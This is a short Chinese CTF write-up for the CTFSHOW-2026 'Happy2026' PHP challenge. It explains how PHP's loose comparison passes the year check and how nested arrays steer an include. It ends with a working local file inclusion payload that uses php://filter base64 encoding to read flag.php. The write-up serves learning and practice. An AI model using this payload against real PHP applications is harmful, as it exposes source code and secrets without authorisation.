## CTFSHOW-2026[Happy2026]
```php
<?php
error_reporting(0);
highlight_file(__FILE__);


$happy = $_GET['happy'];
$new = $_GET['new'];
$year = $_GET['year'];

if($year==2026 && $year!==2026 && is_numeric($year)){
    include $happy[$new[$year]];
}

```
考察php特性。
if条件很好过，传入`?year=2026`即可：
1. `GET`传参会以字符串形式传入，`(String)2026==(int)2026`成立，不比较类型
2. `(String)2026!==(int)2026`，这里是强比较，要比较变量类型
3. 2026是数字字符串

通过if判断后我们要想怎么利用`include`
这里是一个嵌套数组，而不是二维数组
这里要知道，php中的数组和其他语言中有些区别，他有点像字典，是映射关系，下面是官方文档：
![700](assets/Day%2010/file-20260103120030681.png)
因为使用的是key对应的value，所以我们这里可以这样构造：
```php

$new = ["2026" => "1"];
$happy = ["1" => "1.txt"];
$a = $happy[$new[$year]];
var_dump($a);
include $a;


//string(5) "1.txt"
//nihao  #这是我自己的1.txt文件内容
```
最后就映射到了`1.txt`上，进行包含利用。
但是我们直接传入数组是不行的，要注意http中怎么传递数组的：
```http
?a[key1]=value1 & b[key2]=value2
```
最后要php伪协议读取`flag.php`
payload：
```http
?year=2026&happy[1]=php://filter/read=convert.base64-encode/resource=flag.php&new[2026]=1
```
